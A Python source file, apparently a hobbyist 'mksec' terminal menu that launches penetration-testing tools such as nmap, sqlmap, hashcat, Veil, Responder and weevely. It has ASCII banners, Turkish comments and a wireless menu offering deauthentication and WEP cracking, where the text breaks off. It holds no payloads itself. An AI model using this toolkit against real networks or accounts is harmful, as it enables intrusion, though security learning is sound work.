#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import random
import readline

autocompleter = ["no banner","banner","menu","exit","quit","help","?","about","clear","back","information gathering","vulnerability analysis","web application analysis","password attacks","wireless attacks","exploitation tools","sniffing & spoofing","post exploitation","forensics","reporting tools","linux commands","mksec tools","show all tools","dmitry","ike-scan","netdiscover","nbtscan","nmap","theharvester","information gathering more","nikto","unix-privesc-check","chkrootkit","lynis","nessus","skipfish","wpscan","sqlmap","cewl","crunch","hashcat","john","medusa","ncrack","hash-identifier","hashid","wordlists","searchsploit","veil","macchanger","exe2hex","weevely","binwalk","bulk_extractor","foremost","hashdeep","cutycapt","pipal","find","grep","man","payload creator and listener"]
def completer(text,state):
    options = [x for x in autocompleter if x.startswith(text.lower())]
    try:
         return options[state]
    except IndexError:
        return None
readline.set_completer(completer)
readline.parse_and_bind("tab: complete")
os.system("clear")
# responder yapcam en son msfconsole eklemek olabilir. post exploit kategorisinden veili kaldir
# mitmproxy, netsniff-ng, dirbuster, golismero eklenebilir. eklenmezse kategoriden sil.
try:
    banner1 = ("\x1b[1m\x1b[31m\n\n\n\n\n0111100101101111011101010010000001110010\n0110010101100001011011000110110001111001\n0010000001101000011000010111011001100101\n0010000001110100011011110010000001101101\n0111010101100011011010000010000001110100\n0110100101101101011001010010000001101111\n0110111000100000011110010110111101110101\n0111001000100000011010000110000101101110\n0110010001110011001000000010100000111010\n0010000001110100011010000110000101101110\n0110101101110011001000000110011001101111\n0111001000100000011101010111001101101001\n0110111001100111001000000111010001101000\n0110010100100000011011010110101101110011\n0110010101100011001011100010000000101010\n0110100001110101011001110111001100101010\n\n\n\n\n")

    banner2 = ("\x1b[1m\x1b[36m\n\n\n\n\n\n\n\n\n\n.##.....##.##....##..######..########..######.\n.###...###.##...##..##....##.##.......##....##\n.####.####.##..##...##.......##.......##......\n.##.###.##.#####.....######..######...##......\n.##.....##.##..##.........##.##.......##......\n.##.....##.##...##..##....##.##.......##....##\n.##.....##.##....##..######..########..######.\n\n\n\n\n\n\n\n\n")

    banner3 =("\x1b[1m\x1b[36m\n\n\n\n\n\n\n\n\n\n##::::'##:'##:::'##::'######::'########::'######::\n###::'###: ##::'##::'##... ##: ##.....::'##... ##:\n####'####: ##:'##::: ##:::..:: ##::::::: ##:::..::\n## ### ##: #####::::. ######:: ######::: ##:::::::\n##. #: ##: ##. ##::::..... ##: ##...:::: ##:::::::\n##:.:: ##: ##:. ##::'##::: ##: ##::::::: ##::: ##:\n##:::: ##: ##::. ##:. ######:: ########:. ######::\n..:::::..::..::::..:::......:::........:::......::\n\n\n\n\n\n\n\n")

    banner4 =("\x1b[1m\x1b[33m\n\n\n\n\n\n\n                      A\n                     /_\\\n             :      /_|_\\\n            :::    /|__|_\\\n           ::.::  /|_|__|_\      :\n          ::.:.::/__|_|__|_\    :.:\n         :..:.:./_|__|__|__|\  :.:.:\n        :.:..:./|__|___|__|__\:.:..::\n ......::..:../__|___|__|___|_\..:..::........\n    ..:..:..:/_|__|___|___|___|\:..:..::::::::::::\n  ::::.:..:./___|___|___|___|___\..........\n.........../..!...!...!...!...!..\...........\n\t\t  \x1b[36m \x1b[5m-mksec-  \x1b[0m \x1b[1m\n\n\n\n\n\n")

    banner5 =("\x1b[1m\x1b[33m\n\n\n\n\n\n                    \x1b[33m/\\\n                   \x1b[33m/  \                  \x1b[36m___\x1b[36m\n \x1b[36m\     __         \x1b[33m/    \         \x1b[36m__     /\n  \x1b[36m\   /  \   _   \x1b[33m/ <()> \   \x1b[36m_   /  \   /\n   \x1b[36m\_/    \_/ \_\x1b[33m/________\\\x1b[36m_/ \_/    \_/\n\x1b[37m_______________\x1b[33m/__I___I___\\\x1b[37m________________\n              \x1b[33m/_I___I___I__\\\n             /I___I___I___I_\\\n            /___I___I___I___I\\\n           /__I___I___I___I___\\\n          /_I___I___I___I___I__\\\n         /I___I___I___I___I___I_\\\n        /___I___I___I___I___I___I\\\n       /__I___I___I___I___I___I___\\\n      /_I___I___I___I___I___I___I__\\\x1b[37m\n\x1b[36m\t\t \x1b[5m-mksec-  \x1b[0m \x1b[1m\n\n\n\n")

    banner6 =("\x1b[1m\x1b[31m\n\n\nILOVEYOUILOVEYOUILOVEYOUILOVEYOUILOVEYOUILO\nILOVEYOUILO \x1b[37m****** \x1b[31mVEYOU \x1b[37m****** \x1b[31mILOVEYOUILO\nILOVEYOU \x1b[37m*********** \x1b[31mI \x1b[37m*********** \x1b[31mLOVEYOUI\nOUIUI \x1b[37m*************** *************** \x1b[31mVEYOU\nYOUI \x1b[37m********************************** \x1b[31mLOV\nIL \x1b[37m************************************* \x1b[31mOV\nL \x1b[37m*****************\x1b[36m\x1b[5mmksec\x1b[0m\x1b[1m***************** \x1b[31mO\nI \x1b[37m*************************************** \x1b[31mL\nU \x1b[37m*************************************** \x1b[31mI\nOU \x1b[37m************************************* \x1b[31mIL\nUIL \x1b[37m*********************************** \x1b[31mOVE\nOVEYO \x1b[37m******************************* \x1b[31mULOVE\nOVEYOUI \x1b[37m**************************** \x1b[31mLOVEYO\nEYOUILOVE \x1b[37m*********************** \x1b[31mYOUILOVEY\nVEYOUILOVEYOU \x1b[37m***************** \x1b[31mILOVEYOUILO\nILOVEYOUILOVEYO \x1b[37m************* \x1b[31mLOVEYOUILOVEY\nUILOVEYOUILOVEYOU \x1b[37m********* \x1b[31mLOVEYOUILOVEYOU\nLOVEYOUILOVEYOUILOV \x1b[37m***** \x1b[31mILOVEYOUILOVEYOUI\nEYOUILOVEYOUILOVEYOU \x1b[37m*** \x1b[31mYOULOVEYOUILOVEYOU\nVEYOUILOVEYOUILOVEYOU \x1b[37m* \x1b[31mVEYOUILOVEYOUILOVEY\nOVEYOUILOVEYOUILOVEYOUILOVEYOUILOVEYOUILOVE\n\n")

    banner7 =('\x1b[1m\x1b[37m\n\n\n\n\n\n\n888888888888888888888888888888888888888888888888888888888888\n888888888888888888888888888888888888888888888888888888888888\n8888888888888888888888888P""  ""9888888888888888888888888888\n8888888888888888P"88888P          988888"9888888888888888888\n8888888888888888  "9888            888P"  888888888888888888\n888888888888888888bo "9  d8o  o8b  P" od88888888888888888888\n888888888888888888888bob 98"  "8P dod88888888888888888888888\n888888888888888888888888    db    88888888888888888888888888\n88888888888888888888888888      8888888888888888888888888888\n88888888888888888888888P"9bo  odP"98888888888888888888888888\n88888888888888888888P" od88888888bo "98888888888888888888888\n888888888888888888   d88888888888888b   88888888888888888888\n8888888888888888888oo8888888888888888oo888888888888888888888\n888888888888888888888888888888888888888888888888888888888888\n\n\n\n\n')

    banner8 =("""\x1b[1m\x1b[33m\n\n\n\n\n                              /^\\\n           \x1b[35mL L               \x1b[33m/   \               \x1b[35mL L\n        __/|/|_             \x1b[33m/  .  \             \x1b[35m_|\|\__\n       /_| [_[_\           \x1b[33m/     .-\           \x1b[35m/_]_] |_\\\n      /__\  __`-\_____    \x1b[33m/    .    \    \x1b[35m_____/-`__  /__\\\n     /___] /=@>  _   {>  \x1b[33m/-.         \  \x1b[35m<}   _  <@=\ [___\\\n    /____/     /` `--/  \x1b[33m/      .      \  \x1b[35m\--` `\     \____\\\n   /____/  \____/`-._> \x1b[33m/               \ \x1b[35m<_.-`\____/  \____\\\n  /____/    /__/      \x1b[33m/-._     .   _.-  \      \x1b[35m\__\    \____\\\n /____/    /__/      \x1b[33m/         .         \      \x1b[35m\__\    \____\\\n|____/_  _/__/      \x1b[33m/          .          \      \x1b[35m\__\_  _\____|\n \__/_ ``_|_/      \x1b[33m/      -._  .        _.-\      \x1b[35m\_|_`` _\___/\n   /__`-`__\      \x1b[33m<_         `-;           _>      \x1b[35m/__`-`__\\\n      `-`           \x1b[33m`-._       ;       _.-`           \x1b[35m`-`\n                        \x1b[33m`-._   ;   _.-`\n                            \x1b[33m`-._.-`\n\n\n\n\n""")

    banner9 =("""\x1b[1m\x1b[33m\n\n                                            \x1b[37m ___\n                                          \x1b[37m,o88888\n                                       \x1b[37m,o8888888'\n                 \x1b[33m,:o:o:oooo.        \x1b[37m,8O88Pd8888"\n             \x1b[33m,.::.::o:ooooOoOoO. \x1b[37m,oO8O8Pd888'"\n           \x1b[33m,.:.::o:ooOoOoOO8O8OOo.\x1b[37m8OOPd8O8O"\n          \x1b[33m, ..:.::o:ooOoOOOO8OOOOo.\x1b[37mFdO8O8"\n         \x1b[33m, ..:.::o:ooOoOO8O888O8O\x1b[37m,COmCOO"\n        \x1b[33m, . ..:.::o:ooOoOOOO8OOO\x1b[37mOCOCO"\n         \x1b[33m. ..:.::o:ooOoOoOO8O\x1b[37m8OCCCC"\x1b[33mo\n            \x1b[33m. ..:.::o:ooooO\x1b[37moCoCCC"\x1b[33mo:o\n            \x1b[33m. ..:.::o:o:\x1b[37m,cooooCo"\x1b[33moo:o:\n         \x1b[33m`   . . ..:.\x1b[37m:cocoooo"'\x1b[33mo:o:::'\n         \x1b[37m.\x1b[33m`   . ..\x1b[37m::ccccoc"'\x1b[33mo:o:o:::'\n        \x1b[37m:.:.\x1b[33m    \x1b[37m,c:cccc"'\x1b[33m:.:.:.:.:.'\n      \x1b[37m..:.:"'\x1b[33m`\x1b[37m::::c:"'\x1b[33m..:.:.:.:.:.'\n    \x1b[37m...:.'.:.::::"'\x1b[33m    . . . . .'\n   \x1b[37m.. . ....:."' \x1b[33m`   .  . . ''\n \x1b[37m. . . ...."'\n \x1b[37m.. . ."'\n\x1b[37m.\n\n\n""")

    banner10 =("\x1b[1m\x1b[31m\n\n                ..:::::::::..\n           ..:::\x1b[37maad8888888baa\x1b[31m:::..\n        .::::\x1b[37md:?88888888888?::8b\x1b[31m::::.\n      .:::\x1b[37md8888:?88888888??a888888b\x1b[31m:::.\n    .:::\x1b[37md8888888a8888888aa8888888888b\x1b[31m:::.\n   ::::\x1b[37mdP::::::::88888888888::::::::Yb\x1b[31m::::\n  ::::\x1b[37mdP:::::::::Y888888888P:::::::::Yb\x1b[31m::::\n ::::\x1b[37md8:::::::::::Y8888888P:::::::::::8b\x1b[31m::::\n.::::\x1b[37m88::::::::::::Y88888P::::::::::::88\x1b[31m::::.\n:::::\x1b[37mY8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P\x1b[31m:::::\n:::::::\x1b[37mY88888888888P::|::Y88888888888P\x1b[31m:::::::\n::::::::::::::::\x1b[37m888:::|:::888\x1b[31m::::::::::::::::\n`:::::::::::::::\x1b[37m8888888888888b\x1b[31m::::::::::::::'\n :::::::::::::::\x1b[37m88888888888888\x1b[31m::::::::::::::\n  :::::::::::::\x1b[37md88888888888888\x1b[31m:::::::::::::\n   ::::::::::::\x1b[37m88::88::88:::88\x1b[31m::::::::::::\n    `::::::::::\x1b[37m88::88::88:::88\x1b[31m::::::::::'\n      `::::::::\x1b[37m88::88::P::::88\x1b[31m::::::::'\n        `::::::\x1b[37m88::88:::::::88\x1b[31m::::::'\n           ``:::::::::::::::::::''\n                ``:::::::::''\n\n\n")

    banner11 =("""\x1b[1m\x1b[31m\n           ,   ,\n         ,-`{-`/\n      ,-~ , \ {-~~-,\n    ,~  ,   ,`,-~~-,`,\n  ,`   ,   { {      } }                                             \x1b[32m}/\x1b[31m\n ;     ,--/`\ \    / /                                     \x1b[32m}/      /,/\x1b[31m\n;  ,-./      \ \  { {  (                                  \x1b[32m/,;    ,/ ,/\x1b[31m\n; /   `       } } `, `-`-.___                            \x1b[32m/ `,  ,/  `,/\x1b[31m\n \|         ,`,`    `~.___,---}                         \x1b[32m/ ,`,,/  ,`,;\x1b[31m\n  `        { {                                     \x1b[32m__  /  ,`/   ,`,;\x1b[31m\n        /   \ \                                 \x1b[32m_,`, `{  `,{   `,`;`\x1b[31m\n       {     } }       \x1b[37m/~\         \x1b[33m.-:::-.     \x1b[32m(--,   ;\ `,}  `,`;\x1b[31m\n       \\._./ /       \x1b[37m/` , \      \x1b[33m,:::::::::,     \x1b[32m`~;   \},/  `,`;     ,-=-\x1b[31m\n        `-..-`      \x1b[37m/. `  .\_   \x1b[33m;:::::::::::;  \x1b[32m__,{     `/  `,`;     {\x1b[31m\n                   \x1b[37m/ , ~ . ^ `~`\\\x1b[33m:::::::::::\x1b[32m<<~>-,,`,    `-,  ``,_    }\x1b[31m\n                \x1b[37m/~~ . `  . ~  , .`~~\\\x1b[33m:::::::;    \x1b[32m_-~  ;__,        `,-`\x1b[31m\n       \x1b[37m/`\    /~,  . ~ , '  `  ,  .` \\\x1b[33m::::;`   \x1b[32m<<<~```   ``-,,__   ;\x1b[31m\n      \x1b[37m/` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \x1b[32m\\\\, `,__\x1b[31m\n     \x1b[37m/ ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   \x1b[32m`-`--, \\\x1b[31m\n    \x1b[37m/ , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            \x1b[32m``\x1b[31m\n   \x1b[37m/` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___\n \x1b[37m/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,\n\n\n""")

    bannerList = [banner1, banner2, banner3, banner4, banner5, banner6, banner7, banner8, banner9, banner10, banner11]

    words = ['\x1b[0m \x1b[3m\n"Failure is not the opposite of success; its part of success."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Every accomplishment starts with the decision to try."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"I have nothing to lose,but something to gain."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Just because i walk alone doesnt mean im lost."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Dont try to be different. Just be good. To be good is different enough."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Time never comes again."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"A smooth sea never made a skilled sailor."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Its always too early to quit."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Silence is the most powerful scream."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Everything has beauty, but not everyone sees it."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"The best way to predict your future is to create it."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Every accomplishment starts with the decision to try."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Its hard to beat a person who never gives up."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"They can kill the dreamer, but they can never kill the dream."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"I have nothing to lose,but something to gain."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"A person starts dying when they stop dreaming."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Great minds discuss ideas, average minds discuss events, small minds discuss people."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Life is like a coin: You can spend it any way you wish, but you only spend it once."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"You can cut all the flowers, but you cannot keep spring from coming."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"An intelligent hell would be better than a stupid paradise."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Being good is easy, what is difficult is being just."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Some people die at 25 and arent buried until 75."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"Always tell the truth. That way, you dont have to remember what you said."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"The problem with the world is that the intelligent people are full of doubts, while the stupid ones are full of confidence."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"In order to succeed, you must first believe that you can."\x1b[0m\x1b[1m','\x1b[0m \x1b[3m\n"If you can dream it, you can do it."\x1b[0m\x1b[1m']

    hint = ['\x1b[0m \x1b[3m\nType "help" to see all commands.\x1b[0m\x1b[1m ',"\x1b[0m \x1b[3m\nTo open a tool, you can type its name.\x1b[0m\x1b[1m","\x1b[0m \x1b[3m\nYou can open a tool by not only writing its number, but also its name. ex: ig == information gathering\x1b[0m\x1b[1m"]
    
    def Tools(uinput):
        if uinput == "dmitry":
            dmitry()
        elif uinput == "ike-scan":
            ikeScan()
        elif uinput == "netdiscover":
            netdiscover()
        elif uinput == "nbtscan":
            nbtscan()
        elif uinput == "nmap":
            nmap()
        elif uinput == "theharvester":
            theHarvester()
        elif uinput == "more":
            informationGatheringMore()
        elif uinput == "nikto":
            nikto()
        elif uinput == "unix-privesc-check":
            unixPrivescCheck()
        elif uinput == "chkrootkit":
            chkrootkit()
        elif uinput == "lynis":
            lynis()
        elif uinput == "nessus":
            nessus()
        elif uinput == "skipfish":
            skipfish()
        elif uinput == "wpscan":
            wpscan()
        elif uinput == "sqlmap":
            sqlmap()
        elif uinput == "cewl":
            cewl()
        elif uinput == "crunch":
            crunch()
        elif uinput == "hashcat":
            hashcat()
        elif uinput == "john":
            john()
        elif uinput == "medusa":
            medusa()
        elif uinput == "ncrack":
            ncrack()
        elif uinput == "hash-identifier" or uinput == "hashid":
            hashIdentifier()
        elif uinput == "wordlists" or uinput == "wordlist":
            wordlists()
        elif uinput == "payload creator and listener":
            PayloadCreatorAndListener()
        elif uinput == "searchsploit":
            searchsploit()
        elif uinput == "veil":
            veil()
        elif uinput == "macchanger":
            macchanger()
        elif uinput == "mitmproxy":
            macchanger()
        elif uinput == "netsniff-ng":
            macchanger()
        elif uinput == "responder":
            responder()
        elif uinput == "arpspoof":
            arpspoof()
        elif uinput == "exe2hex":
            exe2hex()
        elif uinput == "weevely":
            weevely()
        elif uinput == "binwalk":
            binwalk()
        elif uinput == "bulk_extractor":
            bulkExtractor()
        elif uinput == "foremost":
            foremost()
        elif uinput == "hashdeep":
            hashdeep()
        elif uinput == "cutycapt":
            cutycapt()
        elif uinput == "pipal":
            pipal()
        elif uinput == "find":
            os.system("clear")
            find()
        elif uinput == "grep":
            os.system("clear")
            grep()
        elif uinput == "man":
            os.system("clear")
            man()
        elif uinput == "cli":
            os.system("clear")
            cli()
        elif uinput == "alc" or uinput == "alllinuxcommands" or uinput == "all linux commands":
            os.system("clear")
            alc()

    def RandomBannerSelector():
        print(random.choice(bannerList))
        print(random.choice(words))
        print(random.choice(hint))

    def MainMenu():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tMain Menu\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Information Gathering\n\x1b[37m02\x1b[36m Vulnerability Analysis\n\x1b[37m03\x1b[36m Web Application Analysis\n\x1b[37m04\x1b[36m Password Attacks\n\x1b[37m05\x1b[36m Wireless Attacks\n\x1b[37m06\x1b[36m Exploitation Tools\n\x1b[37m07\x1b[36m Sniffing & Spoofing\n\x1b[37m08\x1b[36m Post Exploitation\n\x1b[37m09\x1b[36m Forensics\n\x1b[37m10\x1b[36m Reporting Tools\n\x1b[37m11\x1b[36m Linux Commands\n\x1b[37m12\x1b[36m Mksec Tools\n\x1b[37m13\x1b[36m Show All Tools\n")
        NoBanner()

    def NoBanner():
        uinput = input("\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.lower().strip()
        Tools(uinput)
        if uinput == "":
            NoBanner()
        elif "no banner" == uinput:
            os.system("clear")
            NoBanner()
        elif uinput == "banner" or "menu" == uinput:
            os.system("clear")
            MainMenu()
        elif uinput == "exit":
            quit()
        elif uinput == "quit":
            quit()
        elif uinput == "help" or uinput == "?":
            os.system("clear")
            help()
        elif uinput == "about":
            os.system("clear")
            about()
        elif uinput == "clear":
            os.system("clear")
            NoBanner()
        elif "back" == uinput:
            print("\x1b[1mUse the 'exit' command to quit.")
            NoBanner()
        elif uinput == "1" or uinput == "01" or uinput == "information gathering":
            os.system("clear")
            informationGathering()
        elif uinput == "2" or uinput == "02" or uinput == "vulnerability analysis":
            os.system("clear")
            vulnerabilityAnalysisTools()
        elif uinput == "3" or uinput == "03" or uinput == "web application analysis":
            os.system("clear")
            webApplicationAnalysis()
        elif uinput == "4" or uinput == "04" or uinput == "password attacks":
            os.system("clear")
            passwordAttacks()
        elif uinput == "5" or uinput == "05" or uinput == "wireless attacks":
            os.system("clear")
            wirelessAttacks()
        elif uinput == "6" or uinput == "06" or uinput == "exploitation tools":
            os.system("clear")
            exploitationTools()
        elif uinput == "7" or uinput == "07" or uinput == "sniffing & spoofing":
            os.system("clear")
            sniffingSpoofing()
        elif uinput == "8" or uinput == "08" or uinput == "post exploitation":
            os.system("clear")
            postExploitation()
        elif uinput == "9" or uinput == "09" or uinput == "forensics":
            os.system("clear")
            forensics()
        elif uinput == "10" or uinput == "reporting tools":
            os.system("clear")
            reportingTools()
        elif uinput == "11" or uinput == "linux commands":
            os.system("clear")
            linuxcommands()
        elif uinput == "12" or uinput == "mksec tools" or uinput == "mksec":
            os.system("clear")
            mksectools()
        elif uinput == "13" or uinput == "show all tools":
            os.system("clear")
            showAllTools()
        else:
            print("\x1b[1m\x1b[31mcommand not found")
            NoBanner()

    def UserInputs(uinput):
        if "back" in uinput.lower():
            if uinput.lower() == "backinformation":
                os.system("clear")
                informationGathering()
            elif uinput.lower() == "backvuln":
                os.system("clear")
                vulnerabilityAnalysisTools()
            elif uinput.lower() == "backwebapp":
                os.system("clear")
                webApplicationAnalysis()
            elif uinput.lower() == "backpass":
                os.system("clear")
                passwordAttacks()
            elif uinput.lower() == "backexp":
                os.system("clear")
                exploitationTools()
            elif uinput.lower() == "backsniff":
                os.system("clear")
                sniffingSpoofing()
            elif uinput.lower() == "backpost":
                os.system("clear")
                postExploitation()
            elif uinput.lower() == "backfore":
                os.system("clear")
                forensics()
            elif uinput.lower() == "backrep":
                os.system("clear")
                reportingTools()
            elif uinput.lower() == "backlin":
                os.system("clear")
                linuxcommands()
            elif uinput.lower() == "backmainmenu":
                os.system("clear")
                MainMenu()
        if "clear" in uinput.lower():
            os.system('printf "\033c"')
        if "about" in uinput.lower():
            about()
        if "exit" in uinput.lower() or "quit" in uinput.lower():
            quit()
        if "help" in uinput.lower() or "?" in uinput.lower():
            os.system("clear")
            help()
        if "about" in uinput.lower():
            os.system("clear")
            about()
    # categories
    def mksectools():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tMksec Tools\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Pythoncompiler")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.lower().strip()
        if  uinput == "1":
            os.system("clear")
            pythonCompiler()
        elif  uinput == "pythoncompiler":
            os.system("clear")
            pythonCompiler()
        elif uinput == "":
            os.system("clear")
            informationGathering()
        elif uinput == "exit":
            quit()
        elif uinput == "quit":
            quit()
        elif uinput == "help":
            os.system("clear")
            help()
        elif uinput == "-h":
            os.system("clear")
            help()
        elif uinput == "--help":
            os.system("clear")
            help()
        elif uinput == "?":
            os.system("clear")
            help()
        elif uinput == "about":
            os.system("clear")
            about()
        elif uinput == "back":
            os.system("clear")
            MainMenu()
        else:
            os.system("clear")
            informationGathering()

    def showAllTools():
        print("\x1b[1m\x1b[36m\n\x1b[7m\tAll Tools\n\x1b[0m\x1b[1m\n\x1b[36m Dmitry\n\x1b[36m Ike-scan\n\x1b[36m Netdiscover\n\x1b[36m Nbtscan\n\x1b[36m Nmap\n\x1b[36m Theharvester\n\x1b[36m More (Information Gathering)\n\x1b[36m Nikto\n\x1b[36m Unix-privesc-check\n\x1b[36m Chrootkit\n\x1b[36m Lynis\\x1b[36m Nessus\n\x1b[36m Skipfish\n\x1b[36m Wpscan\n\x1b[36m Sqlmap\n\x1b[36m Cewl\n\x1b[36m Crunch\n\x1b[36m Hashcat\n\x1b[36m John\n\x1b[36m Medusa\n\x1b[36m Ncrack\n\x1b[36m Hash-identifier\n\x1b[36m Wordlists\n\x1b[36m ***wifi araclari eklenecek***\n\x1b[36m Payload Creator and Listener\n\x1b[36m Searchsploit\n\x1b[36m Veil\n\x1b[36m Macchanger\n\x1b[36m Mitmproxy\n\x1b[36m Netsniff-ng\n\x1b[36m Responder\n\x1b[36m Arpspoof\n\x1b[36m Exe2hex\n\x1b[36m Weevely\n\x1b[36m Binwalk\n\x1b[36m Bulk_Extractor\n\x1b[36m Foremost\n\x1b[36m Hashdeep\n\x1b[36m Cutycapt\n\x1b[36m Pipal\n\x1b[36m Find (Linux Commands)\n\x1b[36m Grep (Linux Commands)\n\x1b[36m Man (Linux Commands)\n\x1b[36m Cli (Linux Commands)\n\x1b[36m All Linux Commands\n")
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[all_tools]\033[37m\x1b[0m ")
            uinput = uinput.strip().lower()
            Tools(uinput)
            UserInputs(uinput+"mainmenu")
            if uinput == "":
                os.system("clear")
                showAllTools()
            elif uinput == "banner" or "menu" == uinput:
                os.system("clear")
                MainMenu()

    def informationGathering():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tInformation Gathering\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Dmitry\n\x1b[37m02\x1b[36m Ike-scan\n\x1b[37m03\x1b[36m Netdiscover\n\x1b[37m04\x1b[36m Nbtscan\n\x1b[37m05\x1b[36m Nmap\n\x1b[37m06\x1b[36m Theharvester\n\x1b[37m07\x1b[36m More")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if  uinput == "1" or uinput == "01" or uinput == "dmitry":
            dmitry()
        elif uinput == "2" or uinput == "02" or uinput == "ike-scan":
            ikeScan()
        elif uinput == "3" or uinput == "03" or uinput == "netdiscover":
            netdiscover()
        elif uinput == "4" or uinput == "04" or uinput == "nbtscan":
            nbtscan()
        elif uinput == "5" or uinput == "05" or uinput == "nmap":
            nmap()
        elif uinput == "6" or uinput == "06" or uinput == "theharvester":
            theHarvester()
        elif uinput == "7" or uinput == "07" or uinput == "information gathering more":
            informationGatheringMore()
        elif uinput == "":
            os.system("clear")
            informationGathering()

    def vulnerabilityAnalysisTools():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tVulnerability Analysis Tools\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Nikto\x1b[37m\n\x1b[37m02\x1b[36m Unix-privesc-check\n\x1b[37m03\x1b[36m Chrootkit\n\x1b[37m04\x1b[36m Lynis\n\x1b[37m05\x1b[36m Nessus")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "nikto":
            nikto()
        elif uinput == "2" or uinput == "02" or uinput == "unix-privesc-check":
            unixPrivescCheck()
        elif uinput == "3" or uinput == "03" or uinput == "chkrootkit":
            chkrootkit()
        elif uinput == "4" or uinput == "04" or uinput == "lynis":
            lynis()
        elif uinput == "5" or uinput == "05" or uinput == "nessus":
            nessus()
        elif uinput == "":
            os.system("clear")
            vulnerabilityAnalysisTools()

    def webApplicationAnalysis():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tWeb Application Analysis\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Skipfish\n\x1b[37m02\x1b[36m Wpscan\n\x1b[37m03\x1b[36m Sqlmap")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "skipfish":
            skipfish()
        elif uinput == "2" or uinput == "02" or uinput == "wpscan":
            wpscan()
        elif uinput == "3" or uinput == "03" or uinput == "sqlmap":
            sqlmap()
        elif uinput == "":
            os.system("clear")
            webApplicationAnalysis()

    def passwordAttacks():
        RandomBannerSelector()
        print("\x1b[1m\x1b[36m\n\x1b[7m\tPassword Attacks\n\x1b[0m\x1b[1m\n\x1b[37m01\x1b[36m Cewl\n\x1b[37m02\x1b[36m Crunch\n\x1b[37m03\x1b[36m Hashcat\n\x1b[37m04\x1b[36m John\n\x1b[37m05\x1b[36m Medusa\n\x1b[37m06\x1b[36m Ncrack\n\x1b[37m07\x1b[36m Hash-identifier\n\x1b[37m08\x1b[36m Wordlist")
        uinput = input("\n\x1b[1m\033[36m[mksec]\033[37m\x1b[0m ")
        uinput = uinput.strip().lower()
        UserInputs(uinput+"mainmenu")
        if uinput == "1" or uinput == "01" or uinput == "cewl":
            cewl()
        elif uinput == "2" or uinput == "02" or uinput == "crunch":
            crunch()
        elif uinput == "3" or uinput == "03" or uinput == "hashcat":
            hashcat()
        elif uinput == "4" or uinput == "04" or uinput == "john":
            john()
        elif uinput == "5" or uinput == "05" or uinput == "medusa":
            medusa()
        elif uinput == "6" or uinput == "06" or uinput == "ncrack":
            ncrack()
        elif uinput == "7" or uinput == "07" or uinput == "hashid" or uinput == "hash-identifier":
            hashIdentifier()
        elif uinput == "8" or uinput == "08" or uinput == "wordlists" or uinput == "wordlist":
            wordlists()
        elif uinput == "":
            os.system("clear")
            passwordAttacks()

    def wirelessAttacks():
        RandomBannerSelector()
        os.system("""echo \x1b[1m\x1b[36m'

                    \x1b[7mWireless Attacks\x1b[0m\x1b[1m

            \x1b[37m1\x1b[36m  Monitor Mode
            \x1b[37m2\x1b[36m  Managed Mode
            \x1b[37m3\x1b[36m  Airodump-ng ile Butun Aglari Izle
            \x1b[37m4\x1b[36m  Airodump-ng ile Hedef Agi Detayli Incele
            \x1b[37m5\x1b[36m  Aireplay-ng ile Deauth (Agdan Dusurme) Saldirisi
            \x1b[37m6\x1b[36m  Aircrack-ng ile Wep Cracking
